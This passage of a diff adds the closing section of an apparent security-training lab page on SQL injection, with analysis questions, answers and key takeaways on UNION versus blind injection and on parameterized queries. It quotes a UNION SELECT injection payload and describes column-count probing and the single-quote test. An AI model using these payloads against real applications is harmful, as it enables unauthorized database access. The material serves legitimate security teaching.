+</code></pre></div>
+</blockquote>
+<p>Paste the assembled flag into the <strong>Submit Flag</strong> form on the platform and click <strong>Submit</strong>.</p>
+<hr />
+<h2 id="analysis-questions">Analysis Questions</h2>
+<p>Consider each question carefully before checking the answer. These questions connect the lab techniques to broader security concepts.</p>
+<p><strong>1. What is the difference between a UNION-based SQL injection and a blind SQL injection, and which is more efficient for data extraction?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>A UNION-based injection appends a second SELECT statement to the original query, allowing the attacker to directly read the results in the application's response. A blind SQL injection occurs when the application does not display query results; the attacker must infer data by observing differences in the application's behavior (boolean-based) or response timing (time-based). UNION-based injection is far more efficient because the data appears directly in the response. Blind injection requires sending many requests to extract data one character at a time: for example, extracting a 32-character password hash via boolean-based blind injection would require hundreds of requests.</p>
+</details>
+<p><strong>2. How do parameterized queries (prepared statements) prevent SQL injection, even when user input contains SQL syntax?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>Parameterized queries separate the query structure from the data. The application sends the SQL template to the database first (e.g., <code>SELECT * FROM users WHERE username = ? AND password = ?</code>), and then sends the user input as separate parameters. The database engine treats the parameters strictly as data values, not as part of the SQL syntax. Even if a user submits <code>' UNION SELECT 1,2,3,4-- -</code>, the database interprets the entire string as a literal username to search for, not as SQL commands. The query structure is fixed at compile time and cannot be altered by user input. Fixing the structure at compile time is why parameterized queries are considered the definitive defense against SQL injection.</p>
+</details>
+<p><strong>3. Why does the UNION injection payload in this exercise require exactly four values? What happens if you provide three or five instead?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>The UNION operator in SQL requires that both SELECT statements return the same number of columns. The original query in this application selects four columns: <code>id</code>, <code>username</code>, <code>password</code>, and <code>email</code>. If the UNION SELECT provides fewer or more columns, the database returns an error like <em>"The used SELECT statements have a different number of columns."</em> In a real assessment, determining the column count is a necessary step before building a UNION payload. Two common techniques: (1) inject <code>ORDER BY N</code> with increasing N until an error occurs: if <code>ORDER BY 4</code> works but <code>ORDER BY 5</code> fails, there are four columns; (2) inject <code>UNION SELECT NULL,NULL,...</code> adding NULLs until the query succeeds, since NULL is type-compatible with any column.</p>
+</details>
+<p><strong>4. In Exercise 10A, the entry point was default credentials. In Exercise 10B, it was SQL injection. From a defender's perspective, which vulnerability is easier to prevent, and why?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>Both are straightforward to prevent, but they require different types of discipline. Default credentials are a configuration problem, the fix is an organizational process that requires changing all default passwords before deployment and auditing for them regularly. SQL injection is a code problem, the fix is using parameterized queries consistently across the entire codebase. In practice, SQL injection is arguably harder to eliminate completely because it requires every developer on the team to follow the secure coding pattern for every query they write. A single missed query in thousands of lines of code creates a vulnerability. Default credentials, by contrast, can be caught with a single automated scan. Both, however, are considered "solved problems" that should not exist in production systems.</p>
+</details>
+<hr />
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ul>
+<li><strong>SQL injection</strong> remains one of the most critical web vulnerabilities (OWASP A03:2021) because it bypasses authentication entirely and grants direct access to the database layer; it exists whenever developers use string concatenation instead of parameterized queries to build SQL statements</li>
+<li><strong>UNION-based injection</strong> allows an attacker to append arbitrary SELECT queries to the original, returning fabricated data that the application trusts; the technique requires matching the exact column count of the original query, which can be discovered through ORDER BY or NULL-based probing</li>
+<li><strong>The single quote test</strong> (<code>'</code> in an input field) is the fastest way to check whether an input is reaching a SQL query unsanitized; any change in application behavior compared to normal input suggests the field is injectable</li>
+<li><strong>Parameterized queries</strong> (prepared statements) are the definitive defense; they keep user input separate from SQL syntax at the database level, making injection impossible regardless of what the user submits</li>
+<li><strong>Chaining vulnerabilities</strong> continues to be the pattern in real-world assessments: directory enumeration (Exercise 10A) finds the portal, SQL injection (this exercise) bypasses the login, and credential leakage on the dashboard enables database pivoting (Exercise 10A technique); Exercise 6 will combine these with lateral movement and privilege escalation from Week 9</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.top", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/mermaid-fix.js?v=4"></script>
+      
+        <script src="../../javascripts/pdf-export.js?v=2"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+      
+    
+  </body>
+</html>
